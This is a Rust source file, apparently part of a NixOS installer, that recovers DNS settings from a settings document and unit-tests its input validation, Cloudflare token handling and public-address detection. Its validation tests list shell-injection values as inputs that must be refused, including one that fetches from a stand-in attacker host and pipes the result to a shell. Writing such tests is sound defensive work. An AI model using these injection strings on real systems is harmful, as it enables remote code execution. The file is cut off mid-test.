/// Recovers R1 A2/A8's decision from a generated settings document.
///
/// Re-validated exactly like every other recovered field, and for the same
/// reason this function's caller gives: between an interrupted run and a
/// resume, that file can legitimately have been edited by hand. An empty
/// `staticAddress` or a `cnameTarget` that is not a hostname must fail here,
/// with the fix in the message, rather than as a Nix assertion thirty
/// minutes into a build.
///
/// # Arguments
/// * `doc` - the parsed `settings.stage2.json`.
///
/// # Returns
/// The recovered decision, or `None` when the document manages no DNS --
/// which is the honest answer for a host that publishes nothing, and is
/// distinguishable from a malformed one because that is an error instead.
///
/// # Errors
/// A record mode that is neither `a` nor `cname`, a target that fails the
/// same validation the prompt applies, or the updater enabled alongside
/// CNAME mode -- the one combination `modules/proxy/dns.nix` rejects.
fn dns_from_settings(doc: &serde_json::Value) -> anyhow::Result<Option<DnsDecision>> {
    let Some(dns) = doc.pointer("/proxy/dns") else {
        return Ok(None);
    };
    if !dns
        .get("enable")
        .and_then(serde_json::Value::as_bool)
        .unwrap_or(false)
    {
        return Ok(None);
    }

    let target = match parse_record_mode(
        dns.get("recordMode")
            .and_then(serde_json::Value::as_str)
            .unwrap_or("a"),
    )? {
        RecordMode::A => RecordTarget::A(validate_public_ipv4(
            dns.get("staticAddress")
                .and_then(serde_json::Value::as_str)
                .unwrap_or_default(),
        )?),
        RecordMode::Cname => RecordTarget::Cname(validate_cname_target(
            dns.get("cnameTarget")
                .and_then(serde_json::Value::as_str)
                .unwrap_or_default(),
        )?),
    };

    let ddns_updater = dns
        .pointer("/ddnsUpdater/enable")
        .and_then(serde_json::Value::as_bool)
        .unwrap_or(false);
    if ddns_updater && matches!(target, RecordTarget::Cname(_)) {
        anyhow::bail!(
            "the recovered settings enable ferrum.proxy.dns.ddnsUpdater with \
             recordMode = \"cname\". modules/proxy/dns.nix asserts that \
             combination is invalid: a CNAME already delegates address \
             tracking to whatever owns the target name, so the updater would \
             have nothing to correct. Turn one of the two off."
        );
    }

    Ok(Some(DnsDecision {
        target,
        ddns_updater,
    }))
}

/// Whether a resumed run still needs the Cloudflare token.
///
/// It does only when the host publishes something and the encrypted file
/// is not already on the target from an earlier attempt.
pub fn token_still_needed(a: &Answers, already_on_host: bool) -> bool {
    a.base_domain.is_some() && needs_acme_credential(&a.apps) && !already_on_host
}

#[cfg(test)]
mod tests {
    /// The real failure: a token pasted out of a zsh terminal carried the
    /// shell's trailing "%" -- its marker for output with no final
    /// newline. It encrypted, shipped and installed fine, then every
    /// certificate order failed with "invalid header field value for
    /// Authorization", reported as a DNS zone problem.
    ///
    /// Mutation check: drop the charset check and this fails.
    #[test]
    fn a_token_carrying_a_shell_artifact_is_refused_with_the_reason() {
        let err = super::validate_cloudflare_token("abcdefghij1234567890abcdefghij1234567890%")
            .expect_err("a trailing % cannot go in an HTTP header");
        let msg = err.to_string();
        assert!(msg.contains("Authorization"), "{msg}");
        // It must name the likely cause, because the character is invisible.
        assert!(msg.contains("zsh"), "{msg}");

        // Whitespace is trimmed rather than refused -- a stray newline or
        // space around a paste is not the operator's mistake to fix twice.
        assert_eq!(
            super::validate_cloudflare_token("  abcdefghij1234567890abcdefghij1234567890 \n")
                .unwrap(),
            "abcdefghij1234567890abcdefghij1234567890"
        );

        // Interior whitespace is a real problem and is refused.
        assert!(
            super::validate_cloudflare_token("abcdefghij12345 67890abcdefghij12345678").is_err()
        );

        // Too short to be a token at all.
        let short = super::validate_cloudflare_token("abc")
            .unwrap_err()
            .to_string();
        assert!(short.contains("too short"), "{short}");

        // A real one passes untouched.
        let good = "aBcD_eFgH-1234567890aBcDeFgH1234567890xy";
        assert_eq!(super::validate_cloudflare_token(good).unwrap(), good);
    }

    use super::*;
    use crate::prompt::testing::Scripted;
    use ferrum_dns::testing::{CannedResponse, FakeCloudflare, Route, TEST_TOKEN};

    /// The zone every test that is not *about* the zone check wants: one
    /// visible zone covering `thesyms.ca`, delegated nowhere.
    ///
    /// Scripted answers are consumed one per request, so a run that made a
    /// call nobody expected gets the fake's loud "nothing scripted" refusal
    /// rather than a plausible success.
    fn script_healthy_zone(fake: &FakeCloudflare) {
        fake.script(
            Route::get("/zones"),
            CannedResponse::ok(serde_json::json!([{
                "id": "z1",
                "name": "thesyms.ca",
                "name_servers": ["amber.ns.cloudflare.com", "bob.ns.cloudflare.com"],
            }])),
        );
        fake.script(
            Route::get("/zones/z1/dns_records"),
            CannedResponse::ok(serde_json::json!([])),
        );
    }

    /// A fake Cloudflare that accepts any well-formed token for
    /// `thesyms.ca`.
    fn healthy_cloudflare() -> FakeCloudflare {
        let fake = FakeCloudflare::start();
        script_healthy_zone(&fake);
        fake
    }

    /// A factory pointing `Client` at the fake instead of the real API.
    ///
    /// Every test in this module goes through this: the Nix sandbox that
    /// runs the workspace suite has no network, so a test reaching
    /// api.cloudflare.com would fail CI by construction -- and would be
    /// checking Cloudflare's availability rather than this code.
    fn verifying_against(
        fake: &FakeCloudflare,
    ) -> impl Fn(ferrum_dns::Secret) -> ferrum_dns::client::Client + '_ {
        let base_url = fake.base_url().to_string();
        move |token| ferrum_dns::client::Client::with_base_url(token, base_url.clone())
    }

    /// The detector for every test whose subject is NOT detection.
    ///
    /// Reports a failure, so the prompt falls back to asking and each test's
    /// scripted answers line up with a detection-free run -- which is also
    /// the real behaviour on a target detection cannot reach. Nothing here
    /// opens a socket: the sandbox running this suite has no network.
    fn no_detection() -> impl FnMut() -> Detected {
        || Detected::Failed {
            reason: "no target in this test".into(),
        }
    }

    /// A detector returning whatever a target would have printed.
    ///
    /// Goes through `address::detect` and its classifier rather than
    /// hand-building a `Detected`, so these tests exercise the same parse
    /// the real SSH path does.
    fn detecting(raw: &'static str) -> impl FnMut() -> Detected {
        move || address::detect(|_command| Ok(raw.to_string()))
    }

    #[test]
    fn hostnames_must_be_dns_labels() {
        assert_eq!(validate_hostname(" Saltbox ").unwrap(), "saltbox");
        for bad in ["", "-a", "a-", "a b", "a_b", "a.b", &"x".repeat(64)] {
            assert!(validate_hostname(bad).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn domains_must_look_like_domains() {
        assert_eq!(validate_domain(" TheSyms.ca ").unwrap(), "thesyms.ca");
        for bad in [
            "localhost",
            ".a.com",
            "a.com.",
            "a b.com",
            // The shapes that matter: this value reaches a remote root shell.
            "example.com;curl$IFS-sattacker/p|sh",
            "a.com`id`",
            "a.com$(id)",
            "a.com|id",
            "a.com&id",
            "a.com'x'",
            "a.com\"x\"",
            "-a.com",
            "a-.com",
            "a..com",
        ] {
            assert!(validate_domain(bad).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn app_selection_accepts_names_all_and_nothing() {
        assert_eq!(parse_app_selection("").unwrap(), Vec::<String>::new());
        assert_eq!(
            parse_app_selection("ALL").unwrap().len(),
            CATALOG_APPS.len()
        );
        assert_eq!(
            parse_app_selection("sonarr, radarr").unwrap(),
            vec!["radarr", "sonarr"]
        );
        assert_eq!(parse_app_selection("plex plex").unwrap(), vec!["plex"]);
    }

    #[test]
    fn an_unknown_app_names_itself_and_the_alternatives() {
        let err = parse_app_selection("sonarr, radar")
            .unwrap_err()
            .to_string();
        assert!(err.contains("radar"), "{err}");
        assert!(
            err.contains("radarr"),
            "the real name should be listed: {err}"
        );
        assert!(
            !err.contains("sonarr,"),
            "should not implicate the valid one: {err}"
        );
    }

    #[test]
    fn a_full_interactive_run_collects_everything() {
        let mut io = Scripted::new(&[
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr, plex",
            "", // SSO: default yes
            "admin@thesyms.ca",
            "cftokenvalue1234567890abcdefghijklmnopqr",
            "",             // record target: default 'a'
            "203.0.113.10", // this server's public address
            "",             // updater: default yes
        ]);
        let fake = healthy_cloudflare();
        let a = collect(&mut io, &verifying_against(&fake), &mut no_detection()).unwrap();
        assert_eq!(a.hostname, "saltbox");
        assert_eq!(a.base_domain.as_deref(), Some("thesyms.ca"));
        assert_eq!(a.apps, vec!["plex", "sonarr"]);
        assert!(a.sso.enabled);
        assert_eq!(
            a.cloudflare_token.as_ref().map(Secret::expose),
            Some("cftokenvalue1234567890abcdefghijklmnopqr")
        );
        assert_eq!(
            a.dns,
            Some(DnsDecision {
                target: RecordTarget::A("203.0.113.10".parse().unwrap()),
                ddns_updater: true,
            })
        );
    }

    /// No domain means nothing is published, so neither ACME nor the token
    /// is asked for -- an operator exploring the questions is never
    /// prompted for a credential they do not need.
    #[test]
    fn no_domain_skips_acme_and_the_token() {
        let mut io = Scripted::new(&["saltbox", "", "plex"]);
        let fake = FakeCloudflare::start();
        let a = collect(&mut io, &verifying_against(&fake), &mut no_detection()).unwrap();
        assert_eq!(a.base_domain, None);
        assert_eq!(a.acme_email, None);
        assert_eq!(a.cloudflare_token, None);
        assert!(!a.sso.enabled);
        let t = io.transcript();
        assert!(!t.contains("Cloudflare"), "should not have asked: {t}");
    }

    /// A domain with no apps publishes nothing, so acme.nix's assertion
    /// never fires and the token is not required.
    #[test]
    fn a_domain_with_no_apps_does_not_require_the_token() {
        let mut io = Scripted::new(&["saltbox", "thesyms.ca", "me@thesyms.ca", "", "", "a@b.co"]);
        let fake = FakeCloudflare::start();
        let a = collect(&mut io, &verifying_against(&fake), &mut no_detection()).unwrap();
        assert!(a.apps.is_empty());
        assert_eq!(a.cloudflare_token, None);
        assert!(
            fake.requests().is_empty(),
            "nothing was collected to check, so nothing should have been asked of Cloudflare"
        );
    }

    /// D-11(b). An unset credential must be an error with a message, never
    /// an empty success.
    ///
    /// The owner's first attempt at this failed exactly that way: a missing
    /// file left the token empty, every request went out unauthenticated,
    /// and the blank result read as "the feature is unsupported" -- a wrong
    /// conclusion reached confidently from a silent failure. So the empty
    /// value is refused *before* a request is made, and the refusal says
    /// why.
    ///
    /// Mutation check: make `validate_cloudflare_token` return `Ok` for an
    /// empty string and this fails on both counts -- the collect succeeds,
    /// and the fake records a request it should never have seen.
    #[test]
    fn an_empty_token_is_refused_with_the_reason_and_never_reaches_the_api() {
        let fake = healthy_cloudflare();
        for blank in ["", "   ", "\t"] {
            let mut io = Scripted::new(&[
                "saltbox",
                "thesyms.ca",
                "me@thesyms.ca",
                "sonarr",
                "",
                "a@b.co",
                blank,
            ]);
            let err = collect(&mut io, &verifying_against(&fake), &mut no_detection())
                .unwrap_err()
                .to_string();
            assert!(err.contains("acme.nix"), "{blank:?}: {err}");
            assert!(err.contains("required"), "{blank:?}: {err}");
        }
        assert!(
            fake.requests().is_empty(),
            "an empty credential must fail at the prompt, not become an \
             unauthenticated request whose blank answer reads as \"unsupported\""
        );
    }

    /// The token must never be written anywhere on the operator's machine.
    /// Debug is the easiest accidental leak, so assert the shape we keep.
    #[test]
    fn the_token_is_only_ever_held_in_memory() {
        let mut io = Scripted::new(&[
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr",
            "",
            "a@b.co",
            "secrettoken1234567890abcdefghijklmnopqrs",
            "a",
            "203.0.113.10",
            "n",
        ]);
        let fake = healthy_cloudflare();
        let a = collect(&mut io, &verifying_against(&fake), &mut no_detection()).unwrap();
        assert!(
            !io.transcript()
                .contains("secrettoken1234567890abcdefghijklmnopqrs"),
            "the token must never be echoed back: {}",
            io.transcript()
        );
        assert_eq!(
            a.cloudflare_token.as_ref().map(Secret::expose),
            Some("secrettoken1234567890abcdefghijklmnopqrs")
        );
    }

    /// The answers a full run gives after the token, so each DNS test can
    /// say only what it is about.
    fn upto_token(token: &'static str) -> Vec<&'static str> {
        vec![
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr",
            "",
            "a@b.co",
            token,
        ]
    }

    /// Runs a full collect whose DNS answers are `extra`.
    fn collect_with_dns(fake: &FakeCloudflare, extra: &[&'static str]) -> anyhow::Result<Answers> {
        let mut script = upto_token(GOOD_TOKEN);
        script.extend_from_slice(extra);
        let mut io = Scripted::new(&script);
        collect(&mut io, &verifying_against(fake), &mut no_detection())
    }

    /// R1 A2. Both shapes are supported and the choice is the operator's.
    ///
    /// Mutation check: render only one mode and the second half fails.
    #[test]
    fn both_record_shapes_are_collected() {
        let fake = healthy_cloudflare();
        let a = collect_with_dns(&fake, &["a", "203.0.113.10", "n"]).unwrap();
        assert_eq!(
            a.dns,
            Some(DnsDecision {
                target: RecordTarget::A("203.0.113.10".parse().unwrap()),
                ddns_updater: false,
            })
        );

        script_healthy_zone(&fake);
        let c = collect_with_dns(&fake, &["cname", "Saltbox.Dynamic-DNS.example.net"]).unwrap();
        assert_eq!(
            c.dns,
            Some(DnsDecision {
                // Lowercased by validate_domain, like every other name.
                target: RecordTarget::Cname("saltbox.dynamic-dns.example.net".into()),
                ddns_updater: false,
            })
        );
    }

    /// R1 A8. The updater is opt-in but recommended, so pressing enter
    /// takes it -- and the question says WHY, because the failure it
    /// prevents is one the operator can never observe for themselves.
    #[test]
    fn the_updater_defaults_to_on_and_says_why() {
        let fake = healthy_cloudflare();
        let mut script = upto_token(GOOD_TOKEN);
        script.extend_from_slice(&["a", "203.0.113.10", ""]);
        let mut io = Scripted::new(&script);
        let a = collect(&mut io, &verifying_against(&fake), &mut no_detection()).unwrap();
        assert_eq!(
            a.dns.as_ref().map(|d| d.ddns_updater),
            Some(true),
            "an empty answer must take the recommended path"
        );
        let t = io.transcript();
        assert!(
            t.contains("unreachable from outside"),
            "the operator must be told what goes wrong: {t}"
        );

        // ...and 'n' is still honoured. It is a recommendation, not a gate.
        script_healthy_zone(&fake);
        let off = collect_with_dns(&fake, &["a", "203.0.113.10", "no"]).unwrap();
        assert_eq!(off.dns.map(|d| d.ddns_updater), Some(false));
    }

    /// R1 A8 / modules/proxy/dns.nix's own assertion: the updater exists to
    /// correct an A record, and a CNAME already delegates that job. Asking
    /// would let the operator answer yes and meet a Nix assertion instead
    /// of an install.
    ///
    /// Mutation check: offer it unconditionally and the script runs one
    /// answer short, so this fails.
    #[test]
    fn the_updater_is_not_offered_at_all_for_a_cname() {
        let fake = healthy_cloudflare();
        let mut script = upto_token(GOOD_TOKEN);
        script.extend_from_slice(&["cname", "dyn.example.net"]);
        let mut io = Scripted::new(&script);
        let a = collect(&mut io, &verifying_against(&fake), &mut no_detection()).unwrap();
        assert_eq!(a.dns.map(|d| d.ddns_updater), Some(false));
        let t = io.transcript();
        assert!(
            !t.contains("up to date automatically"),
            "the question must not have been asked: {t}"
        );
    }

    /// D-11(b) again, for this story's own inputs. An empty answer must be
    /// an error with a message, never a value that quietly becomes "".
    /// modules/proxy/dns.nix's assertions would catch it, but thirty
    /// minutes later and naming Nix rather than the question.
    #[test]
    fn an_empty_target_is_refused_at_the_prompt_naming_the_assertion() {
        for blank in ["", "   "] {
            let address = validate_public_ipv4(blank).unwrap_err().to_string();
            assert!(address.contains("staticAddress"), "{blank:?}: {address}");
            let hostname = validate_cname_target(blank).unwrap_err().to_string();
            assert!(hostname.contains("cnameTarget"), "{blank:?}: {hostname}");
        }
    }

    /// UF-18. IPv6 is out of scope by decision, and the message has to say
    /// so: an operator who pastes their AAAA address and gets "not an IPv4
    /// address" will reasonably read it as a parser that cannot cope.
    #[test]
    fn ipv6_is_refused_as_a_scope_decision_not_a_parse_failure() {
        for v6 in ["2001:db8::1", "::1", "fe80::1"] {
            let err = validate_public_ipv4(v6).unwrap_err().to_string();
            assert!(err.contains("UF-18"), "{v6}: {err}");
            assert!(err.contains("AAAA"), "{v6}: {err}");
        }
    }

    #[test]
    fn an_address_must_actually_be_one() {
        assert_eq!(
            validate_public_ipv4(" 203.0.113.10 ").unwrap(),
            std::net::Ipv4Addr::new(203, 0, 113, 10)
        );
        for bad in [
            "203.0.113",
            "203.0.113.256",
            "203.0.113.10/32",
            "example.com",
            "203.0.113.10;id",
        ] {
            assert!(validate_public_ipv4(bad).is_err(), "accepted {bad:?}");
        }
    }

    /// The reachability note is a note. An operator on a network this
    /// installer does not understand still gets to decide.
    #[test]
    fn an_unreachable_address_is_reported_and_still_accepted() {
        let fake = healthy_cloudflare();
        let mut script = upto_token(GOOD_TOKEN);
        // 100.64/10 -- carrier-grade NAT, the case a residential connection
        // hits when the ISP hands out no real address.
        script.extend_from_slice(&["a", "100.64.1.5", "n"]);
        let mut io = Scripted::new(&script);
        let a = collect(&mut io, &verifying_against(&fake), &mut no_detection()).unwrap();
        assert_eq!(
            a.dns.map(|d| d.target),
            Some(RecordTarget::A("100.64.1.5".parse().unwrap())),
            "the answer is the operator's"
        );
        assert!(
            io.transcript().contains("outside this network can reach"),
            "but they must be told: {}",
            io.transcript()
        );

        for reachable in ["203.0.113.10", "8.8.8.8"] {
            assert!(is_reachable_from_outside(&reachable.parse().unwrap()));
        }
        for unreachable in ["192.168.1.10", "10.0.0.1", "127.0.0.1", "169.254.1.1"] {
            assert!(
                !is_reachable_from_outside(&unreachable.parse().unwrap()),
                "{unreachable} should have been flagged"
            );
        }
    }

    /// Runs a full collect with a detector, returning the answers and the io
    /// so a test can assert on what the operator actually saw.
    fn collect_detecting(
        fake: &FakeCloudflare,
        detected: &'static str,
        extra: &[&'static str],
    ) -> (Answers, Scripted) {
        let mut script = upto_token(GOOD_TOKEN);
        script.extend_from_slice(extra);
        let mut io = Scripted::new(&script);
        let a = collect(&mut io, &verifying_against(fake), &mut detecting(detected)).unwrap();
        (a, io)
    }

    /// R1 A8, the happy path: found on the target, shown, accepted by
    /// pressing enter -- and recorded as detected, not entered.
    ///
    /// Mutation check: have `ask_a_record_address` return the candidate
    /// without ever printing it, and the "shown for confirmation" assertion
    /// fails; drop the default and the script runs an answer short.
    #[test]
    fn a_detected_public_address_is_shown_then_taken_by_pressing_enter() {
        let fake = healthy_cloudflare();
        let (a, io) = collect_detecting(&fake, "203.0.113.10\n", &["a", "", "n"]);
        assert_eq!(
            a.dns.map(|d| d.target),
            Some(RecordTarget::A("203.0.113.10".parse().unwrap()))
        );
        let t = io.transcript();
        assert!(
            t.contains("Detected on the target: 203.0.113.10"),
            "A8 requires it shown before it is used: {t}"
        );
        assert!(
            t.contains("asking the server itself, over the"),
            "the operator must be told WHERE it was detected, because an \
             address found on this machine would be the wrong one: {t}"
        );
        assert!(
            t.contains("point at 203.0.113.10 (detected on the target)"),
            "the source must be stated with the value: {t}"
        );
    }

    /// The operator overrides the detected value, and it goes through the
    /// same validation a detection-free run uses.
    ///
    /// Mutation check: accept the typed value without `validate_public_ipv4`
    /// and the rejected-garbage half fails.
    #[test]
    fn an_override_is_honoured_labelled_and_still_validated() {
        let fake = healthy_cloudflare();
        let (a, io) = collect_detecting(&fake, "203.0.113.10", &["a", "198.51.100.7", "n"]);
        assert_eq!(
            a.dns.map(|d| d.target),
            Some(RecordTarget::A("198.51.100.7".parse().unwrap())),
            "the operator's answer wins over the detected one"
        );
        assert!(
            io.transcript()
                .contains("point at 198.51.100.7 (you entered this)"),
            "an entered address must not be reported as detected: {}",
            io.transcript()
        );

        // A rejected override falls back to the plain prompt, which gives
        // the same three tries every other answer gets.
        script_healthy_zone(&fake);
        let (b, _) = collect_detecting(
            &fake,
            "203.0.113.10",
            &["a", "not-an-address", "198.51.100.8", "n"],
        );
        assert_eq!(
            b.dns.map(|d| d.target),
            Some(RecordTarget::A("198.51.100.8".parse().unwrap()))
        );
    }

    /// 'r' looks again rather than being read as an address.
    #[test]
    fn the_operator_can_ask_it_to_look_again() {
        let fake = healthy_cloudflare();
        let mut script = upto_token(GOOD_TOKEN);
        script.extend_from_slice(&["a", "r", "", "n"]);
        let mut io = Scripted::new(&script);
        let mut looks = 0usize;
        let a = collect(&mut io, &verifying_against(&fake), &mut || {
            looks += 1;
            address::detect(|_| Ok("203.0.113.10".to_string()))
        })
        .unwrap();
        assert_eq!(looks, 2, "'r' must run detection again, not parse as input");
        assert_eq!(
            a.dns.map(|d| d.target),
            Some(RecordTarget::A("203.0.113.10".parse().unwrap()))
        );
    }

    /// R1 A8 / D-11(b). A CGNAT answer is reported and NOT offered as a
    /// default: the whole point is that pressing enter cannot accept it.
    ///
    /// Mutation check: offer any parsed IPv4 as the default and the script
    /// runs an answer long -- `collect` then fails with "scripted input
    /// exhausted", which is this test dying.
    #[test]
    fn a_detected_cgnat_address_is_reported_never_offered() {
        let fake = healthy_cloudflare();
        let (a, io) = collect_detecting(&fake, "100.64.1.5", &["a", "203.0.113.10", "n"]);
        assert_eq!(
            a.dns.map(|d| d.target),
            Some(RecordTarget::A("203.0.113.10".parse().unwrap())),
            "the CGNAT address must not have become the record's value"
        );
        let t = io.transcript();
        assert!(t.contains("carrier-grade NAT"), "{t}");
        assert!(
            !t.contains("[100.64.1.5]"),
            "it must never appear as a default an operator can accept by \
             pressing enter: {t}"
        );
        assert!(
            t.contains("point at 203.0.113.10 (you entered this)"),
            "{t}"
        );
        assert!(
            !io.asked.iter().any(|q| q.contains("'r' to look again")),
            "the candidate prompt must not be used at all for a CGNAT \
             answer -- there is nothing to accept: {t}"
        );
    }

    /// UF-18. A detected IPv6 address never reaches an A record.
    ///
    /// Mutation check: let `Detected::candidate` return something for the
    /// IPv6 arm and the script runs an answer long, killing this test.
    #[test]
    fn a_detected_ipv6_address_never_becomes_an_a_record() {
        let fake = healthy_cloudflare();
        let (a, io) = collect_detecting(&fake, "2001:db8::1", &["a", "203.0.113.10", "n"]);
        assert_eq!(
            a.dns.map(|d| d.target),
            Some(RecordTarget::A("203.0.113.10".parse().unwrap()))
        );
        let t = io.transcript();
        assert!(t.contains("2001:db8::1"), "it must be shown: {t}");
        assert!(
            t.contains("UF-18"),
            "and named as a scope decision rather than a parse failure: {t}"
        );
        assert!(!t.contains("[2001:db8::1]"), "never a default: {t}");
        assert!(
            !io.asked.iter().any(|q| q.contains("'r' to look again")),
            "the candidate prompt must not be used at all: an IPv6 detection \
             offers NO default, not a substituted one: {t}"
        );
        assert!(
            io.asked
                .iter()
                .any(|q| q == "This server's public IPv4 address:"),
            "it falls back to the plain prompt: {t}"
        );
    }

    /// D-11(b), the case the owner actually lost an attempt to: detection
    /// produced nothing. That must be a stated failure and a fallback to
    /// asking -- never a blank or defaulted address, and never an abort.
    ///
    /// Mutation check: return `Detected::Public(Ipv4Addr::UNSPECIFIED)` for
    /// empty output and the address assertion fails; propagate the failure
    /// as an error and `collect` returns `Err`, also failing here.
    #[test]
    fn detection_that_finds_nothing_states_it_and_asks() {
        let fake = healthy_cloudflare();
        let (a, io) = collect_detecting(&fake, "", &["a", "203.0.113.10", "n"]);
        assert_eq!(
            a.dns.map(|d| d.target),
            Some(RecordTarget::A("203.0.113.10".parse().unwrap())),
            "an empty detection must not degrade into a default address"
        );
        let t = io.transcript();
        assert!(t.contains("neither curl nor wget"), "{t}");
        assert!(
            t.contains("This server's public IPv4 address:"),
            "the fallback is asking, with the reason stated first: {t}"
        );

        // And a detection that could not run at all behaves the same way.
        script_healthy_zone(&fake);
        let mut script = upto_token(GOOD_TOKEN);
        script.extend_from_slice(&["a", "203.0.113.10", "n"]);
        let mut io = Scripted::new(&script);
        let b = collect(&mut io, &verifying_against(&fake), &mut || {
            address::detect(|_| anyhow::bail!("ssh target failed: no route to host"))
        })
        .unwrap();
        assert_eq!(
            b.dns.map(|d| d.target),
            Some(RecordTarget::A("203.0.113.10".parse().unwrap()))
        );
        assert!(
            io.transcript().contains("no route to host"),
            "the reason is stated rather than swallowed: {}",
            io.transcript()
        );
    }

    /// Detection is not run at all for a CNAME: there is no address to find,
    /// and running it would print a paragraph about something the operator
    /// has just said they do not want.
    #[test]
    fn a_cname_run_never_looks_for_an_address() {
        let fake = healthy_cloudflare();
        let mut script = upto_token(GOOD_TOKEN);
        script.extend_from_slice(&["cname", "dyn.example.net"]);
        let mut io = Scripted::new(&script);
        let mut looks = 0usize;
        collect(&mut io, &verifying_against(&fake), &mut || {
            looks += 1;
            address::detect(|_| Ok("203.0.113.10".to_string()))
        })
        .unwrap();
        assert_eq!(looks, 0, "a CNAME follows a name, not an address");
    }

    /// The operator-facing text for all four A8 outcomes, printed so it can
    /// be reviewed as prose rather than as format strings.
    ///
    /// Run with `cargo test -p ferrum-install a8_prompts -- --nocapture`.
    /// The assertions are the test; the printing is what makes the wording
    /// reviewable, which for a feature whose entire value is "the operator
    /// looked at it" is the part worth checking.
    #[test]
    fn a8_prompts_read_correctly_to_an_operator() {
        for (case, detected, extra) in [
            ("detected and usable", "203.0.113.10", &["a", "", "n"][..]),
            (
                "detected but CGNAT",
                "100.64.1.5",
                &["a", "203.0.113.10", "n"][..],
            ),
            (
                "detected IPv6",
                "2001:db8::1",
                &["a", "203.0.113.10", "n"][..],
            ),
            ("detection failed", "", &["a", "203.0.113.10", "n"][..]),
        ] {
            let fake = healthy_cloudflare();
            let (_, io) = collect_detecting(&fake, detected, extra);
            println!("\n===== {case} =====");
            for line in &io.said {
                println!("{line}");
            }
            println!("--- questions asked ---");
            for line in &io.asked {
                println!("{line}");
            }
            assert!(
                io.said
                    .iter()
                    .any(|s| s.contains("Looking for this server")),
                "{case}: detection must announce itself"
            );
        }
    }

    /// A CNAME target is a DNS name and gets the same allowlist every other
    /// name in this file gets -- it reaches the same settings document and
    /// the same reconciler.
    #[test]
    fn a_cname_target_must_be_a_hostname() {
        assert_eq!(
            validate_cname_target(" Dyn.Example.NET ").unwrap(),
            "dyn.example.net"
        );
        for bad in [
            "localhost",
            "dyn.example.net`id`",
            "dyn example.net",
            "-a.com",
        ] {
            assert!(validate_cname_target(bad).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn a_record_mode_must_be_one_of_the_two() {
        assert_eq!(parse_record_mode(" A ").unwrap(), RecordMode::A);
        assert_eq!(parse_record_mode("CNAME").unwrap(), RecordMode::Cname);
        // Deliberately NOT defaulted: the prompt supplies its own default,
        // so a blank recordMode in a settings document is an error.
        for bad in ["", "aaaa", "alias", "txt"] {
            assert!(parse_record_mode(bad).is_err(), "accepted {bad:?}");
        }
    }

    /// No token means no credential to manage records with, and
    /// modules/proxy/dns.nix asserts one is declared -- so the question is
    /// not asked, rather than asked and discarded.
    #[test]
    fn no_token_means_the_dns_questions_are_never_asked() {
        let mut io = Scripted::new(&["saltbox", "", "plex"]);
        let fake = FakeCloudflare::start();
        let a = collect(&mut io, &verifying_against(&fake), &mut no_detection()).unwrap();
        assert_eq!(a.dns, None);
        let t = io.transcript();
        assert!(!t.contains("Record target"), "should not have asked: {t}");
    }

    /// Recovered like every other field, and re-validated like every other
    /// field: that document lives in the operator's own bind mount.
    #[test]
    fn the_dns_decision_is_recovered_and_re_validated() {
        let doc = |dns: serde_json::Value| {
            serde_json::json!({
                "proxy": { "baseDomain": "thesyms.ca", "dns": dns },
                "apps": { "sonarr": { "enable": true } },
            })
            .to_string()
        };

        let a = from_stage2(
            &doc(serde_json::json!({
                "enable": true,
                "recordMode": "a",
                "staticAddress": "203.0.113.10",
                "ddnsUpdater": { "enable": true },
            })),
            "saltbox",
        )
        .unwrap();
        assert_eq!(
            a.dns,
            Some(DnsDecision {
                target: RecordTarget::A("203.0.113.10".parse().unwrap()),
                ddns_updater: true,
            })
        );

        // A hand-blanked address is the exact shape of D-11(b)'s failure:
        // an empty value that reads as "nothing to do".
        let blanked = from_stage2(
            &doc(serde_json::json!({ "enable": true, "recordMode": "a", "staticAddress": "" })),
            "saltbox",
        )
        .unwrap_err()
        .to_string();
        assert!(blanked.contains("staticAddress"), "{blanked}");

        // The one combination dns.nix rejects, caught here instead.
        let impossible = from_stage2(
            &doc(serde_json::json!({
                "enable": true,
                "recordMode": "cname",
                "cnameTarget": "dyn.example.net",
                "ddnsUpdater": { "enable": true },
            })),
            "saltbox",
        )
        .unwrap_err()
        .to_string();
        assert!(impossible.contains("ddnsUpdater"), "{impossible}");

        // Disabled, and absent, both mean "this host manages no records".
        assert_eq!(
            from_stage2(&doc(serde_json::json!({ "enable": false })), "saltbox")
                .unwrap()
                .dns,
            None
        );
        assert_eq!(
            from_stage2(
                &serde_json::json!({ "proxy": { "baseDomain": "thesyms.ca" }, "apps": {} })
                    .to_string(),
                "saltbox"
            )
            .unwrap()
            .dns,
            None
        );
    }

    /// A resume must never re-prompt: the operator answered before
    /// anything was destroyed.
    #[test]
    fn answers_are_recovered_from_the_generated_stage_two_document() {
        let doc = serde_json::json!({
            "schemaVersion": 1,
            "proxy": { "enable": true, "baseDomain": "thesyms.ca", "acme": { "email": "me@thesyms.ca" } },
            "apps": { "sonarr": { "enable": true }, "plex": { "enable": true } },
            "auth": { "enable": true, "adminEmail": "admin@thesyms.ca" }
        });
        let a = from_stage2(&doc.to_string(), "saltbox").unwrap();
        assert_eq!(a.hostname, "saltbox");
        assert_eq!(a.base_domain.as_deref(), Some("thesyms.ca"));
        assert_eq!(a.apps, vec!["plex", "sonarr"]);
        assert!(a.sso.enabled);
        assert_eq!(a.sso.admin_email.as_deref(), Some("admin@thesyms.ca"));
    }

    /// The token was deliberately never written anywhere, so it cannot be
    /// recovered -- and must not be silently treated as absent-and-fine.
    #[test]
    fn the_token_is_never_recovered_from_disk() {
        let doc = serde_json::json!({ "apps": { "sonarr": { "enable": true } } });
        let a = from_stage2(&doc.to_string(), "h").unwrap();
        assert_eq!(a.cloudflare_token, None);
    }

    #[test]
    fn a_resume_re_asks_for_the_token_only_when_it_is_still_needed() {
        let doc = serde_json::json!({
            "proxy": { "enable": true, "baseDomain": "d.com" },
            "apps": { "sonarr": { "enable": true } }
        });
        let a = from_stage2(&doc.to_string(), "h").unwrap();
        assert!(token_still_needed(&a, false));
        assert!(!token_still_needed(&a, true), "already delivered");

        let no_apps = from_stage2(
            &serde_json::json!({ "proxy": { "baseDomain": "d.com" }, "apps": {} }).to_string(),
            "h",
        )
        .unwrap();
        assert!(!token_still_needed(&no_apps, false));
    }

    #[test]
    fn a_recovered_document_without_auth_reads_as_sso_off() {
        let a = from_stage2(&serde_json::json!({ "apps": {} }).to_string(), "h").unwrap();
